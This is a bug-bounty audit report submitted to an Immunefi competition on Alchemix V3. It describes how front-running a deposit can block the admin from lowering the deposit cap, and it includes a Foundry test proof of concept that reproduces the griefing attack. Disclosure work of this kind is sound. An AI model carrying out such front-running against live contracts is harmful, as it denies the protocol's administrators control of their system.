# 57208 sc insight it is possible to prevent lowering the deposit cap by front running

**Submitted on Oct 24th 2025 at 11:46:06 UTC by @PotEater for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57208
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**

## Description

## Brief/Intro

The function `setDepositCap` can be DoS'd by front-running when setting the deposit cap to a lower value.

## Vulnerability Details

The function `setDepositCap` implements a check that ensures the `depositCap` is always `>= IERC20(myt).balanceOf(address(this)));`

This makes the function vulnerable to a front-running/griefing attack where the attacker can simply front-run the admin, depositing a huge amount of tokens into the contract so it hits the deposit cap.

Now when the admin tx completes, it will revert, because the input value is lower than the contract's MYT balance. After that, the attacker can freely withdraw the tokens immediately without any restrictions or fees. Increasing likelihood of this griefing attack and creating ideal conditions.

## Impact Details

The impact is partial Denial of Service. The admin would be only able to increase the deposit cap, not decrease.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L237>

## Proof of Concept

## Proof of Concept

Add this function to the `AlchemistV3.t.sol` test file:

PoC:

```solidity
    function test_PoC() external {
        // A: admin calls setDepositCap

        uint256 amount = 101e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);

        // B: Attacker front-runs the admin and deposits tokens

        alchemist.deposit(amount, address(0xbeef), 0);
        vm.stopPrank();

        vm.prank(address(0xdead));
        vm.expectRevert();

        // C: Now admin tx completes, but reverts, because attacker front-ran
        alchemist.setDepositCap(100e18);

        // D: Now the attacker withdraws his tokens, remaining prepared for another front-run
        vm.prank(address(0xbeef));
        alchemist.withdraw(amount, address(0xbeef), 1);
    }
```
